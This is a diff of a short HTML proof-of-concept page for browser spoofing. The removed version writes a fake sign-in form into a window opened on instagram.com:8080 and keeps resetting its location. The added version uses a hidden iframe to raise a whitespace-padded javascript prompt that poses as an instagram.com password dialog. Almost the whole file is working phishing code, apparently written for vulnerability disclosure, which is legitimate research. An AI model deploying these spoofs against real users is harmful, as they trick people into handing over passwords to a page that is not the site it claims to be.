@@ -1,26 +1,18 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>PoC</title>
+    <script>
+    function triggerIframe() {
+        var iframe = document.createElement('iframe');
+        document.location="http://www.instagram.com";
+        iframe.src = 'javascript:prompt("www.instagram.com says                                                                                                                                     Password:")';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+    }
+    </script>
+</head>
 <body>
-<button onclick="spoof()">Click to spoof</button>
-<script>
-function spoof() {
-    let win = window.open("https://www.instagram.com:8080");
-    let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
-        '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
-        '<h1>This is NOT Google!</h1>' +
-        '<p>Please enter your credentials:</p>' +
-        '<form style="margin-top:20px;">' +
-        '<input type="text" placeholder="Username" style="display:block; margin:10px auto; padding:8px; width:200px;">' +
-        '<input type="password" placeholder="Password" style="display:block; margin:10px auto; padding:8px; width:200px;">' +
-        '<button type="submit" style="padding:8px 16px; background-color:#4285F4; color:white; border:none; cursor:pointer;">Sign In</button>' +
-        '</form>' +
-        '</div>';
-    win.document.write(payload);
-    win.document.close();
-    setInterval(function() {
-        win.location.replace("https://www.instagram.com:8080");
-    }, 10);  // Small interval to preserve the spoof
-}
-</script>
+    <button onclick="triggerIframe()">Trigger</button>
 </body>
 </html>
